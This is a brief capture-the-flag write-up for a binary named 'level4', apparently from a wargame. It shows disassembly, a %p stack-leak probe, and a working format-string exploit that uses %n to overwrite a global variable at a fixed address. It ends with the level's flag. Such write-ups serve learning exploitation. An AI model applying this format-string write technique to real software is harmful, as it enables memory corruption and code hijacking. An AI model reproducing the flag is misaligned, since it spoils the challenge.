# level4

## disassemble

```shell
objdump -dC -M intel level4
```

## exploit

```shell
python2.7 -c 'print("BBBB" + " %p"*12)'  | ./level4
```

```shell
# 8048488:       e8 b7 ff ff ff          call   8048444 <p>
# 804848d:       a1 10 98 04 08          mov    eax,ds:0x8049810
# 8048492:       3d 44 55 02 01          cmp    eax,0x1025544

python2.7 -c 'print("\x10\x98\x04\x08" + "%16930112x" "%12$n")' > /tmp/exploit.txt
cat /tmp/exploit.txt | ./level4
```

# flag

```shell
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
